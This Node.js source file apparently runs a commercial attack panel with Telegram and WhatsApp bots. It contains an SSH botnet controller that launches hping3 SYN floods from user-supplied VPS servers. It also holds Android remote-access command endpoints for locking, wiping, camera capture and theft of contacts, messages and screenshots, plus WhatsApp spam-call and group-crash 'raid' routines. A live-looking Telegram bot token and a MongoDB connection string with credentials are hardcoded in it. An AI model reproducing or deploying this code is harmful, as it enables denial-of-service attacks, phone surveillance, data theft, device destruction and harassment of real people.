const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
let multer, upload;
try {
  multer = require('multer');
  const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
  });
  upload = multer({ storage });
} catch (_) { multer = null; upload = null; }
let mongoose;
try { mongoose = require("mongoose"); } catch (_) { mongoose = null; }
const os = require('os');
const WebSocket = require('ws');
let nodemailer;
try { nodemailer = require('nodemailer'); } catch (_) { nodemailer = null; }
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const TELEGRAM_DATA_PATH = "telegram.json";
const NEWS_FILE = "./news.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const numberBugs = [
  { bug_id: "number1", bug_name: "DELAY" },
  { bug_id: "number2", bug_name: "FREZER" },
  { bug_id: "number3", bug_name: "BLANK" },
];

const groupBugs = [
  { bug_id: "grub1", bug_name: "BAN GRUB" },
];

const bugs = numberBugs;
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Load news
function loadNews() {
  if (fs.existsSync(NEWS_FILE)) {
    return JSON.parse(fs.readFileSync(NEWS_FILE, 'utf8'));
  }
  return [];
}

// Save news
function saveNews(newsArr) {
  fs.writeFileSync(NEWS_FILE, JSON.stringify(newsArr, null, 2));
}

let newsCache = loadNews();

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8614370664:AAFMHUlW9briV_2KhkHgN0grKz8xVXJRTfM"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

const ID_GROUP = [
  -1003966477111,
];

const ID_GROUP_UTAMA = [
  -1003966477111,
];

function sendToGroups(text, options = {}) {
  for (const groupid of ID_GROUP) {
    bot.sendMessage(groupid, text, options).catch(err => {
      console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
    });
  }
}

function sendToGroupsUtama(text, options = {}) {
  for (const groupid of ID_GROUP_UTAMA) {
    bot.sendMessage(groupid, text, options).catch(err => {
      console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
    });
  }
}

function buildAccountCreationNotification(newUser, creatorUsername, durationDays) {
  const createdAt = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
  });

  return `✅ *Akun Baru Dibuat*\n` +
    `Username: ${newUser.username}\n` +
    `Password: ${newUser.password}\n` +
    `Role: ${newUser.role}\n` +
    `Dibuat Oleh: ${creatorUsername}\n` +
    `Durasi: ${durationDays} hari\n` +
    `Waktu: ${createdAt}`;
}

const OWNER_ID = 7393048172;

wss.on('connection', function (ws, req) {
  let username = null;
  let keepAliveInterval = null;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!data.androidId || validKey.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: validKey.username,
          androidId: validKey.androidId,
          role: validKey.role || "member"
        }));

        // Keep alive interval
        keepAliveInterval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!data.androidId || validKey.androidId !== data.androidId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }
        }, 10000);
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

      // ========== HANDLE STATS ==========
      if (data.type === 'stats') {
        // Hitung online users dari activeKeys yang masih valid
        const now = Date.now();
        const onlineUserNames = [];

        for (const key in activeKeys) {
          const keyInfo = activeKeys[key];
          if (keyInfo && keyInfo.expires > now) {
            onlineUserNames.push(keyInfo.username);
          }
        }

        // Unique users
        const uniqueOnlineUsers = [...new Set(onlineUserNames)];

        // Hitung active connections (jumlah WebSocket yang connect)
        let activeConnectionsCount = 0;
        for (const clientId in wsClients) {
          if (wsClients[clientId] && wsClients[clientId].readyState === WebSocket.OPEN) {
            activeConnectionsCount++;
          }
        }

        // Kirim balik ke client
        ws.send(JSON.stringify({
          type: 'stats',
          onlineUsers: uniqueOnlineUsers.length,
          activeConnections: activeConnectionsCount
        }));
        return;
      }

      if (data.type === 'get_online_users') {
        const now = Date.now();
        const onlineUserNames = [];

        for (const k in activeKeys) {
          const info = activeKeys[k];
          if (info && info.expires > now) {
            onlineUserNames.push(info.username);
          }
        }

        const uniqueUsers = [...new Set(onlineUserNames)];

        let activeConnectionsCount = 0;
        for (const clientId in wsClients) {
          if (wsClients[clientId] && wsClients[clientId].readyState === WebSocket.OPEN) {
            activeConnectionsCount++;
          }
        }

        ws.send(JSON.stringify({
          type: 'get_online_users',
          onlineUsers: uniqueUsers.length,
          activeConnections: activeConnectionsCount,
          users: uniqueUsers
        }));
        return;
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    // Bersihkan interval
    if (keepAliveInterval) {
      clearInterval(keepAliveInterval);
      keepAliveInterval = null;
    }

    // Hapus dari wsClients
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

function getPort(defaultPort = 4444) {
  // DEBUG: Log semua environment variables yang berkaitan dengan port
  console.log('🔍 DEBUG Environment Variables:');
  console.log('   PORT:', process.env.PORT);
  console.log('   SERVER_PORT:', process.env.SERVER_PORT);
  console.log('   PTERO_PORT:', process.env.PTERO_PORT);

  // Prioritas 1: Environment variable PORT (Pterodactyl/Panel standard)
  if (process.env.PORT) {
    const envPort = parseInt(process.env.PORT, 10);
    if (!isNaN(envPort) && envPort > 0) {
      console.log(`✅ Using PORT from environment: ${envPort}`);
      return envPort;
    }
  }

  // Prioritas 2: SERVER_PORT (alternative)
  if (process.env.SERVER_PORT) {
    const envPort = parseInt(process.env.SERVER_PORT, 10);
    if (!isNaN(envPort) && envPort > 0) {
      console.log(`✅ Using SERVER_PORT from environment: ${envPort}`);
      return envPort;
    }
  }

  // Prioritas 3: Default port
  console.log(`⚠️  No environment port found, using default: ${defaultPort}`);
  return defaultPort;
}

// Find available port jika port default sudah digunakan
async function findAvailablePort(startPort) {
  const net = require('net');

  return new Promise((resolve, reject) => {
    const server = net.createServer();

    server.listen(startPort, () => {
      const port = server.address().port;
      server.close(() => resolve(port));
    });

    server.on('error', (err) => {
      if (err.code === 'EADDRINUSE') {
        // Port sudah digunakan, coba port berikutnya
        resolve(findAvailablePort(startPort + 1));
      } else {
        reject(err);
      }
    });
  });
}

const DEFAULT_PORT = 4444;
const wsPort = getPort(DEFAULT_PORT);
const PORT = wsPort;




app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


// ---------------------------------------------------------------------------
// WA Report — WhatsApp abuse report via email
// ---------------------------------------------------------------------------
const qrcode = require('qrcode');
let WAClient, LocalAuth;
try {
  const ww = require('whatsapp-web.js');
  WAClient = ww.Client;
  LocalAuth = ww.LocalAuth;
} catch (_) { WAClient = null; LocalAuth = null; }
const REPORT_SESSION_PATH = process.env.WA_REPORT_SESSION_DIR || './wa-report-session';

let waReportClient = null;
let waReportReady = false;
let waReportQR = null;

function getWaReportClient() {
  if (!WAClient) return null;
  if (!waReportClient) {
    waReportClient = new WAClient({
      authStrategy: new LocalAuth({ clientId: 'wa-reporter', dataPath: REPORT_SESSION_PATH }),
      puppeteer: { headless: true, args: ['--no-sandbox', '--disable-gpu'] },
    });
    waReportClient.on('qr', async (qr) => { waReportQR = await qrcode.toDataURL(qr); console.log('[WA-REPORT] QR received'); });
    waReportClient.on('ready', () => { waReportReady = true; waReportQR = null; console.log('[WA-REPORT] Ready'); });
    waReportClient.on('disconnected', () => { waReportReady = false; });
    waReportClient.initialize();
  }
  return waReportClient;
}

// Email transporter untuk abuse report
const abuseTransporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.gmail.com',
  port: parseInt(process.env.SMTP_PORT || '587'),
  secure: process.env.SMTP_SECURE === 'true',
  auth: {
    user: process.env.SMTP_USER || '',
    pass: process.env.SMTP_PASS || '',
  },
});

const ABUSE_EMAILS = [
  'abuse@whatsapp.com',
  'abuse@support.whatsapp.com',
  'support@whatsapp.com',
];

app.get('/wa-report/qrcode', (req, res) => {
  getWaReportClient();
  if (waReportReady) return res.json({ ready: true });
  if (!waReportQR) return res.status(503).json({ error: 'QR not generated yet' });
  res.json({ ready: false, qr: waReportQR });
});

app.get('/wa-report/chats', async (req, res) => {
  getWaReportClient();
  if (!waReportReady) return res.status(425).json({ error: 'Client not authenticated' });
  const chats = await waReportClient.getChats();
  res.json({
    success: true, data: chats.map((c) => ({
      id: c.id._serialized, name: c.name || c.contact?.name || c.id.user || 'Unknown',
      unreadCount: c.unreadCount, lastMessagePreview: c.lastMessage?.body || '', timestamp: c.timestamp,
    }))
  });
});

app.get('/wa-report/chat/:id', async (req, res) => {
  getWaReportClient();
  if (!waReportReady) return res.status(425).json({ error: 'Client not authenticated' });
  const chat = await waReportClient.getChatById(req.params.id);
  const msgs = await chat.fetchMessages({ limit: parseInt(req.query.limit) || 50 });
  res.json({
    success: true, chatId: req.params.id, chatName: chat.name, data: msgs.map((m) => ({
      id: m.id._serialized, from: m.from, body: m.body, type: m.type, timestamp: m.timestamp, isMe: m.fromMe,
    }))
  });
});

app.post('/wa-report/report', async (req, res) => {
  const { target, reason, evidence } = req.body;
  if (!target) return res.status(400).json({ error: 'Target number required' });

  const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
  const reportBody = `
WhatsApp Abuse Report
=====================
Reported Number: ${target}
Reason: ${reason || 'Spam/Abuse'}
Timestamp: ${new Date().toISOString()}

Evidence:
${evidence || 'No additional evidence'}

--- Auto-generated report from WA Report Tool ---
  `.trim();

  const results = [];
  for (const email of ABUSE_EMAILS) {
    try {
      await abuseTransporter.sendMail({
        from: process.env.SMTP_USER || 'reporter@example.com',
        to: email,
        subject: `WhatsApp Abuse Report — ${target}`,
        text: reportBody,
      });
      results.push({ email, status: 'sent' });
    } catch (e) {
      results.push({ email, status: 'failed', error: e.message });
    }
  }

  const successCount = results.filter((r) => r.status === 'sent').length;
  res.json({ success: true, sent: successCount, total: results.length, results });
});

app.use('/reports', express.static(path.join(__dirname, '..', 'reports')));

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

const MONGO_URI = 'mongodb+srv://fantzy:12@cluster0fantxy.o03hx6y.mongodb.net/ghost_platform?retryWrites=true&w=majority';
mongoose.connect(MONGO_URI).then(() => console.log('MongoDB Connected')).catch(err => console.error(err));

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, unique: true, required: true },
  name: String, userTag: String, model: String, ip: String, battery: String,
  isOnline: { type: Boolean, default: false }, lastSeen: Date,
  lockSettings: { isActive: Boolean, pin: String, title: String, message: String, imageUrl: String },
  command: { type: String, default: 'idle' }, commandPayload: Object,
  contacts: Array, messages: Array, deviceInfo: Object,
  notifications: Array,
  lastScreenshot: String,
  lastCameraShot: String
});
const Device = mongoose.model('Device', deviceSchema);

setInterval(async () => {
  const threshold = new Date(Date.now() - 15000);
  try { await Device.updateMany({ isOnline: true, lastSeen: { $lt: threshold } }, { $set: { isOnline: false } }); } catch (e) { }
}, 5000);

app.post('/api/register', async (req, res) => {
  const { deviceId, name, userTag, model, ip, battery } = req.body;
  try {
    let device = await Device.findOne({ deviceId });
    if (!device) device = new Device({ deviceId });
    if (name) device.name = name; if (userTag) device.userTag = userTag;
    if (model) device.model = model; if (battery) device.battery = battery;
    device.isOnline = true; device.lastSeen = new Date();
    await device.save(); res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/devices', async (req, res) => { try { res.json(await Device.find({}).sort({ lastSeen: -1 })) } catch (e) { res.status(500).json({ error: e.message }) } });

app.post('/api/upload', upload.single('image'), (req, res) => { res.json({ success: true, url: `http://holow.alannxd.my.id:3006/uploads/${req.file.filename}` }) });

app.post('/api/command', async (req, res) => {
  const { deviceId, command, payload } = req.body;
  await Device.findOneAndUpdate({ deviceId }, { command, commandPayload: payload });
  res.json({ success: true })
});
app.get('/api/sync/:deviceId', async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId });
    if (!device) return res.status(404).json({ error: 'Unknown' });
    const cmd = device.command; const payload = device.commandPayload;
    const instants = ['LOCK', 'UNLOCK', 'LOCKHARD', 'FLASH_ON', 'FLASH_OFF', 'DISCO_START', 'DISCO_STOP', 'SET_WALLPAPER', 'WIPE_DATA', 'ALARM', 'GET_CONTACTS', 'GET_MESSAGES', 'GET_DEVICE_INFO', 'CAPTURE_SCREEN', 'CAM_FRONT', 'CAM_BACK', 'GET_ALL_DATA', 'START_LIVE_SCREEN', 'STOP_LIVE_SCREEN'];
    if (instants.includes(cmd)) await Device.findOneAndUpdate({ deviceId: req.params.deviceId }, { command: 'idle', commandPayload: null });
    res.json({ command: cmd, payload: payload, settings: device.lockSettings });
  } catch (e) { res.status(500).json({ error: e.message }) }
});
app.post('/api/intel/:type', async (req, res) => {
  const { deviceId, data } = req.body; const type = req.params.type; let update = {};
  if (type === 'contacts') update = { contacts: data };
  if (type === 'messages') update = { messages: data };
  if (type === 'notification') update = { $push: { notifications: { $each: [data], $slice: -100 } } };
  if (type === 'screenshot') update = { lastScreenshot: data.url };
  if (type === 'camera') update = { lastCameraShot: data.url };
  if (type === 'device_info') update = { deviceInfo: data };
  await Device.findOneAndUpdate({ deviceId }, update); res.json({ success: true });
});
app.get('/api/intel/:deviceId', async (req, res) => {
  const device = await Device.findOne({ deviceId: req.params.deviceId });
  res.json({
    notifications: device?.notifications || [],
    contacts: device?.contacts || [],
    messages: device?.messages || [],
    lastScreenshot: device?.lastScreenshot || "",
    lastCameraShot: device?.lastCameraShot || "",
    deviceInfo: device?.deviceInfo || {}
  });
});

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {

    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true); dulu
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
          // 1. Unblock target dulu
          await sock.updateBlockStatus(jid, "unblock");

          await sock.offerCall(jid, true);
          // 1. Unblock target dulu
          await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await DelayVisi(sock, groupJid);
          await newDelay(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

